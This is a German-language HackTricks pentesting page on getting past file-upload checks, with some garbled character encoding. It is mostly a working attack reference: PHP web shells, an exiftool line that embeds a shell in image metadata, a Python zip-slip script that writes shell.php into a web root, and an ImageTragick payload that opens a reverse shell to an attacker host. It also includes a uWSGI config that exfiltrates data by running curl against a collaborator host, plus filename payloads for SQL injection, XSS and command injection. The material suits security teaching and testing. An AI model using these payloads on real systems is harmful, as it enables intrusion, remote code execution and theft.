# Datei-Upload

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie an einer **Hacking-Karriere** interessiert sind und das Unhackbare hacken m√∂chten - **wir stellen ein!** (_flie√üend Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## Allgemeine Methodik f√ºr Datei-Uploads

Andere n√ºtzliche Erweiterungen:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Arbeiten in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Umgehung von √úberpr√ºfungen der Dateierweiterungen

1. Wenn sie zutreffen, **√ºberpr√ºfen** Sie die **vorherigen Erweiterungen.** Testen Sie sie auch mit einigen **Gro√übuchstaben**: _pHp, .pHP5, .PhAr ..._
2. _√úberpr√ºfen Sie **das Hinzuf√ºgen einer g√ºltigen Erweiterung vor** der Ausf√ºhrungs-Erweiterung (verwenden Sie auch vorherige Erweiterungen):_
* _file.png.php_
* _file.png.Php5_
3. Versuchen Sie, **Sonderzeichen am Ende hinzuzuf√ºgen.** Sie k√∂nnten Burp verwenden, um alle **ASCII**- und **Unicode**-Zeichen zu **bruteforcen**. (_Beachten Sie, dass Sie auch die **vorher** genannten **Erweiterungen** verwenden k√∂nnen_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Versuchen Sie, die Schutzma√ünahmen zu umgehen, indem Sie den **Erweiterungsparser** auf der Serverseite mit Techniken wie **Verdopplung** der **Erweiterung** oder **Hinzuf√ºgen von Junk**-Daten (**null** Bytes) zwischen den Erweiterungen t√§uschen. _Sie k√∂nnen auch die **vorherigen Erweiterungen** verwenden, um eine bessere Payload vorzubereiten._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. F√ºgen Sie **eine weitere Schicht von Erweiterungen** zur vorherigen √úberpr√ºfung hinzu:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Versuchen Sie, die **exec-Erweiterung vor der g√ºltigen Erweiterung** zu setzen und beten Sie, dass der Server falsch konfiguriert ist. (n√ºtzlich, um Apache-Misconfigurationen auszunutzen, bei denen alles mit der Erweiterung **.php** ausgef√ºhrt wird, aber nicht unbedingt mit .php enden muss):
* _z.B.: file.php.png_
7. Verwenden von **NTFS-Alternativdatenstr√∂men (ADS)** in **Windows**. In diesem Fall wird ein Doppelpunktzeichen ‚Äú:‚Äù nach einer verbotenen Erweiterung und vor einer erlaubten eingef√ºgt. Infolgedessen wird eine **leere Datei mit der verbotenen Erweiterung** auf dem Server erstellt (z.B. ‚Äúfile.asax:.jpg‚Äù). Diese Datei k√∂nnte sp√§ter mit anderen Techniken bearbeitet werden, z.B. mit ihrem kurzen Dateinamen. Das Muster ‚Äú**::$data**‚Äù kann auch verwendet werden, um nicht leere Dateien zu erstellen. Daher kann das Hinzuf√ºgen eines Punktzeichens nach diesem Muster auch n√ºtzlich sein, um weitere Einschr√§nkungen zu umgehen (z.B. ‚Äúfile.asp::$data.‚Äù)
8. Versuchen Sie, die Dateinamensgrenzen zu √ºberschreiten. Die g√ºltige Erweiterung wird abgeschnitten. Und das b√∂sartige PHP bleibt. AAA<--SNIP-->AAA.php

```
# Linux maximal 255 Bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 hier und .png hinzuf√ºgen
# Laden Sie die Datei hoch und √ºberpr√ºfen Sie die Antwort, wie viele Zeichen sie zul√§sst. Angenommen 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Machen Sie die Payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Umgehung von Content-Type, Magic Number, Kompression & Gr√∂√üen√§nderung

* Umgehen Sie **Content-Type**-√úberpr√ºfungen, indem Sie den **Wert** des **Content-Type**-**Headers** auf: _image/png_, _text/plain_, application/octet-stream_ setzen.
1. Content-Type **Wortliste**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Umgehen Sie die **Magic Number**-√úberpr√ºfung, indem Sie am Anfang der Datei die **Bytes eines echten Bildes** hinzuf√ºgen (verwirren Sie den _file_-Befehl). Oder f√ºhren Sie die Shell in die **Metadaten** ein:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder Sie k√∂nnten auch **die Payload direkt** in ein Bild einf√ºgen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Wenn **Kompression zu Ihrem Bild hinzugef√ºgt wird**, z.B. mit einigen Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht n√ºtzlich. Sie k√∂nnten jedoch die **PLTE-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzuf√ºgen, der **Kompression √ºbersteht**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
* Die Webseite k√∂nnte auch das **Bild** **verkleinern**, z.B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`. Sie k√∂nnten jedoch die **IDAT-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzuf√ºgen, der **Kompression √ºbersteht**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
* Eine weitere Technik, um eine Payload zu erstellen, die **eine Gr√∂√üen√§nderung eines Bildes √ºbersteht**, verwendet die PHP-GD-Funktion `thumbnailImage`. Sie k√∂nnten jedoch die **tEXt-Chunks** [**Technik hier definiert**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um etwas Text einzuf√ºgen, der **Kompression √ºbersteht**.
* [**Github mit dem Code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zur √úberpr√ºfung

* Finden Sie eine Schwachstelle, um die Datei, die bereits hochgeladen wurde, **umzubenennen** (um die Erweiterung zu √§ndern).
* Finden Sie eine **Local File Inclusion**-Schwachstelle, um das Backdoor auszuf√ºhren.
* **M√∂gliche Informationsoffenlegung**:
1. Laden Sie **mehrmals** (und zur **gleichen Zeit**) die **gleiche Datei** mit dem **gleichen Namen** hoch.
2. Laden Sie eine Datei mit dem **Namen** einer **Datei** oder **Ordners**, der **bereits existiert**.
3. Laden Sie eine Datei mit **‚Äú.‚Äù, ‚Äú..‚Äù oder ‚Äú‚Ä¶‚Äù als Namen** hoch. Zum Beispiel, in Apache in **Windows**, wenn die Anwendung die hochgeladenen Dateien im Verzeichnis ‚Äú/www/uploads/‚Äù speichert, wird der Dateiname ‚Äú.‚Äù eine Datei namens ‚Äúuploads‚Äù im Verzeichnis ‚Äú/www/‚Äù erstellen.
4. Laden Sie eine Datei hoch, die m√∂glicherweise nicht leicht gel√∂scht werden kann, wie **‚Äú‚Ä¶:.jpg‚Äù** in **NTFS**. (Windows)
5. Laden Sie eine Datei in **Windows** mit **ung√ºltigen Zeichen** wie `|<>*?‚Äù` in ihrem Namen hoch. (Windows)
6. Laden Sie eine Datei in **Windows** mit **reservierten** (**verbotenen**) **Namen** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
* Versuchen Sie auch, eine **ausf√ºhrbare Datei** (.exe) oder eine **.html** (weniger verd√§chtig) hochzuladen, die **Code ausf√ºhrt**, wenn sie versehentlich vom Opfer ge√∂ffnet wird.

### Besondere Erweiterungstricks

Wenn Sie versuchen, Dateien auf einen **PHP-Server** hochzuladen, [sehen Sie sich den **.htaccess**-Trick an, um Code auszuf√ºhren](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Wenn Sie versuchen, Dateien auf einen **ASP-Server** hochzuladen, [sehen Sie sich den **.config**-Trick an, um Code auszuf√ºhren](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar`-Dateien sind wie die `.jar` f√ºr Java, aber f√ºr PHP, und k√∂nnen **wie eine PHP-Datei verwendet werden** (indem sie mit PHP ausgef√ºhrt oder in ein Skript eingebunden werden...)

Die `.inc`-Erweiterung wird manchmal f√ºr PHP-Dateien verwendet, die nur zum **Importieren von Dateien** verwendet werden, sodass jemand zu einem bestimmten Zeitpunkt **diese Erweiterung zur Ausf√ºhrung** zulassen k√∂nnte.

## **Jetty RCE**

Wenn Sie eine XML-Datei auf einen Jetty-Server hochladen k√∂nnen, k√∂nnen Sie [RCE erhalten, weil **neue \*.xml und \*.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Wie im folgenden Bild erw√§hnt, laden Sie die XML-Datei in `$JETTY_BASE/webapps/` hoch und erwarten Sie die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

F√ºr eine detaillierte Untersuchung dieser Schwachstelle √ºberpr√ºfen Sie die urspr√ºngliche Forschung: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) Schwachstellen k√∂nnen in uWSGI-Servern ausgenutzt werden, wenn man die M√∂glichkeit hat, die `.ini`-Konfigurationsdatei zu √§ndern. uWSGI-Konfigurationsdateien nutzen eine spezifische Syntax, um "magische" Variablen, Platzhalter und Operatoren einzuf√ºgen. Besonders der '@'-Operator, der als `@(dateiname)` verwendet wird, ist daf√ºr gedacht, den Inhalt einer Datei einzuf√ºgen. Unter den verschiedenen unterst√ºtzten Schemas in uWSGI ist das "exec"-Schema besonders m√§chtig, da es das Lesen von Daten aus dem Standardausgang eines Prozesses erm√∂glicht. Diese Funktion kann f√ºr b√∂swillige Zwecke wie Remote Command Execution oder Arbitrary File Write/Read manipuliert werden, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachten Sie das folgende Beispiel einer sch√§dlichen `uwsgi.ini`-Datei, die verschiedene Schemas zeigt:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausf√ºhrung des Payloads erfolgt w√§hrend des Parsens der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst werden kann, muss der uWSGI-Prozess entweder neu gestartet werden (m√∂glicherweise nach einem Absturz oder aufgrund eines Denial of Service-Angriffs) oder die Datei muss auf automatisches Neuladen eingestellt werden. Die Auto-Reload-Funktion, wenn aktiviert, l√§dt die Datei in festgelegten Intervallen neu, wenn √Ñnderungen erkannt werden.

Es ist entscheidend, die nachl√§ssige Natur des Parsens der Konfigurationsdatei von uWSGI zu verstehen. Insbesondere kann der besprochene Payload in eine Bin√§rdatei (wie ein Bild oder PDF) eingef√ºgt werden, was den Umfang der potenziellen Ausnutzung weiter erweitert.

## **wget File Upload/SSRF Trick**

In einigen F√§llen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und Sie k√∂nnen die **URL** **angeben**. In diesen F√§llen √ºberpr√ºft der Code m√∂glicherweise, ob die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Diese **√úberpr√ºfung kann jedoch umgangen werden.**\
Die **maximale** L√§nge eines **Dateinamens** in **linux** betr√§gt **255**, jedoch k√ºrzt **wget** die Dateinamen auf **236** Zeichen. Sie k√∂nnen eine Datei mit dem Namen **"A"\*232+".php"+".gif"** **herunterladen**, dieser Dateiname wird die **√úberpr√ºfung umgehen** (da in diesem Beispiel **".gif"** eine **g√ºltige** Erweiterung ist), aber `wget` wird die Datei in **"A"\*232+".php"** **umbenennen**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Beachten Sie, dass **eine andere Option**, an die Sie denken k√∂nnten, um diese √úberpr√ºfung zu umgehen, darin besteht, den **HTTP-Server auf eine andere Datei umzuleiten**, sodass die urspr√ºngliche URL die √úberpr√ºfung umgeht und wget die umgeleitete Datei mit dem neuen Namen herunterl√§dt. Dies **funktioniert nicht** **es sei denn**, wget wird mit dem **Parameter** `--trust-server-names` verwendet, da **wget die umgeleitete Seite mit dem Namen der Datei herunterl√§dt, die in der urspr√ºnglichen URL angegeben ist**.

## Tools

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) ist ein leistungsstarkes Tool, das Pentestern und Bug-Huntern hilft, Datei-Upload-Mechanismen zu testen. Es nutzt verschiedene Bug-Bounty-Techniken, um den Prozess der Identifizierung und Ausnutzung von Schwachstellen zu vereinfachen und gr√ºndliche Bewertungen von Webanwendungen sicherzustellen.

## Vom Datei-Upload zu anderen Schwachstellen

* Setzen Sie **filename** auf `../../../tmp/lol.png` und versuchen Sie, eine **Pfad Traversierung** zu erreichen.
* Setzen Sie **filename** auf `sleep(10)-- -.jpg` und Sie k√∂nnten in der Lage sein, eine **SQL-Injection** zu erreichen.
* Setzen Sie **filename** auf `<svg onload=alert(document.domain)>`, um ein XSS zu erreichen.
* Setzen Sie **filename** auf `; sleep 10;`, um einige Befehlsinjektionen zu testen (mehr [Befehlsinjektions-Tricks hier](../command-injection.md)).
* [**XSS** in Bild (svg) Datei-Upload](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** Datei **Upload** + **XSS** = [**Service Workers** Ausnutzung](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE in svg Upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** durch Hochladen einer svg-Datei](../open-redirect.md#open-redirect-uploading-svg-files)
* Versuchen Sie **verschiedene svg Payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Ber√ºhmte **ImageTrick** Schwachstelle](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Wenn Sie **den Webserver anweisen k√∂nnen, ein Bild von einer URL abzurufen**, k√∂nnten Sie versuchen, eine [SSRF](../ssrf-server-side-request-forgery/) auszunutzen. Wenn dieses **Bild** auf einer **√∂ffentlichen** Seite **gespeichert** wird, k√∂nnten Sie auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und **Informationen von jedem Besucher stehlen**.
* [**XXE und CORS** Umgehung mit PDF-Adobe Upload](pdf-upload-xxe-and-cors-bypass.md)
* Speziell gestaltete PDFs f√ºr XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausf√ºhrung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn Sie PDFs hochladen k√∂nnen, k√∂nnten Sie einige PDFs vorbereiten, die beliebiges JS ausf√ºhren, gem√§√ü den gegebenen Anweisungen.
* Laden Sie den \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalt hoch, um zu √ºberpr√ºfen, ob der Server ein **Antivirus** hat.
* √úberpr√ºfen Sie, ob es eine **Gr√∂√üenbeschr√§nkung** beim Hochladen von Dateien gibt.

Hier ist eine Top-10-Liste von Dingen, die Sie durch Hochladen erreichen k√∂nnen (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV-Injektion
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML-Injektion / XSS / Open Redirect
8. **PNG / JPEG**: Pixel Flood Attack (DoS)
9. **ZIP**: RCE √ºber LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-Erweiterung

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magische Header-Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) f√ºr andere Dateitypen.

### Zip/Tar-Datei automatisch dekomprimiert hochladen

Wenn Sie eine ZIP-Datei hochladen k√∂nnen, die auf dem Server dekomprimiert wird, k√∂nnen Sie 2 Dinge tun:

#### Symlink

Laden Sie einen Link hoch, der symbolische Links zu anderen Dateien enth√§lt. Dann, beim Zugriff auf die dekomprimierten Dateien, werden Sie auf die verlinkten Dateien zugreifen:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimieren in verschiedenen Ordnern

Die unerwartete Erstellung von Dateien in Verzeichnissen w√§hrend der Dekompression ist ein erhebliches Problem. Trotz anf√§nglicher Annahmen, dass dieses Setup m√∂glicherweise gegen die Ausf√ºhrung von OS-Befehlen durch b√∂sartige Datei-Uploads sch√ºtzen k√∂nnte, k√∂nnen die hierarchische Unterst√ºtzung f√ºr Kompression und die Verzeichnisdurchquerungsf√§higkeiten des ZIP-Archivformats ausgenutzt werden. Dies erm√∂glicht Angreifern, Einschr√§nkungen zu umgehen und sichere Upload-Verzeichnisse zu verlassen, indem sie die Dekompressionsfunktionalit√§t der angegriffenen Anwendung manipulieren.

Ein automatisierter Exploit zum Erstellen solcher Dateien ist verf√ºgbar unter [**evilarc auf GitHub**](https://github.com/ptoomey3/evilarc). Das Dienstprogramm kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Zus√§tzlich ist der **Symlink-Trick mit evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzuvisieren, sollte ein Symlink zu dieser Datei in Ihrem System erstellt werden. Dies stellt sicher, dass evilarc w√§hrend seiner Ausf√ºhrung keine Fehler auftritt.

Unten ist ein Beispiel f√ºr Python-Code, der verwendet wird, um eine b√∂sartige Zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Missbrauch von Kompression f√ºr File Spraying**

F√ºr weitere Details **√ºberpr√ºfen Sie den Originalbeitrag in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle auszuf√ºhren, die √ºber die `$_REQUEST`-Variable √ºbergeben werden.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2.  **File Spraying und Erstellung komprimierter Dateien**: Mehrere Dateien werden erstellt und ein Zip-Archiv wird zusammengestellt, das diese Dateien enth√§lt.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3.  **√Ñnderung mit einem Hex-Editor oder vi**: Die Namen der Dateien im Zip werden mit vi oder einem Hex-Editor ge√§ndert, wobei "xxA" in "../" ge√§ndert wird, um Verzeichnisse zu durchlaufen.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Laden Sie diesen Inhalt mit einer Bilddateiendung hoch, um die Schwachstelle auszunutzen **(ImageMagick , 7.0.1-1)** (aus dem [Exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP-Shell in PNG

Das Einbetten einer PHP-Shell im IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie h√§ufig zum √Ñndern der Gr√∂√üe und zum Resampling von Bildern verwendet werden. Die F√§higkeit der eingebetteten PHP-Shell, von diesen Operationen unber√ºhrt zu bleiben, ist ein erheblicher Vorteil f√ºr bestimmte Anwendungsf√§lle.

Eine detaillierte Erkundung dieser Technik, einschlie√ülich ihrer Methodik und potenziellen Anwendungen, wird im folgenden Artikel bereitgestellt: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verst√§ndnis des Prozesses und seiner Implikationen.

Weitere Informationen unter: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-Dateien

Polyglot-Dateien dienen als einzigartiges Werkzeug in der Cybersicherheit und fungieren als Cham√§leons, die gleichzeitig in mehreren Dateiformaten g√ºltig existieren k√∂nnen. Ein faszinierendes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf diese Kombination beschr√§nkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls m√∂glich.

Der Hauptnutzen von Polyglot-Dateien liegt in ihrer F√§higkeit, Sicherheitsma√ünahmen zu umgehen, die Dateien basierend auf dem Typ √ºberpr√ºfen. √úbliche Praktiken in verschiedenen Anwendungen erlauben nur bestimmte Dateitypen zum Hochladen‚Äîwie JPEG, GIF oder DOC‚Äîum das Risiko potenziell sch√§dlicher Formate (z. B. JS, PHP oder Phar-Dateien) zu mindern. Ein Polyglot kann jedoch, indem es den strukturellen Kriterien mehrerer Dateitypen entspricht, diese Einschr√§nkungen heimlich umgehen.

Trotz ihrer Anpassungsf√§higkeit sto√üen Polyglots auf Einschr√§nkungen. Zum Beispiel k√∂nnte der Erfolg des Hochladens eines Polyglots, das gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG verk√∂rpert, von den Richtlinien der Plattform bez√ºglich der Dateiendungen abh√§ngen. Wenn das System strenge Vorgaben zu zul√§ssigen Erweiterungen hat, k√∂nnte die blo√üe strukturelle Dualit√§t eines Polyglots nicht ausreichen, um sein Hochladen zu garantieren.

Weitere Informationen unter: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referenzen

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
